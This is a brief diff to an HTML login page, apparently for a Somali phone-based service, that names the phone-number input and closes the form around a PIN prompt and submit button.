@@ -126,7 +126,7 @@ button {
 
     <div class="phone-box">
         <span>🇸🇴 +252</span>
-        <input type="tel" id="phone" placeholder="612345678">
+        <input type="tel" id="phone" name="phone" placeholder="612345678">
     </div>
 
     <p>Geli PIN-kaaga</p>
@@ -143,6 +143,7 @@ button {
     <br>
 
     <button id="submitBtn">GAL</button>
+ </form>
 
 </div>
 
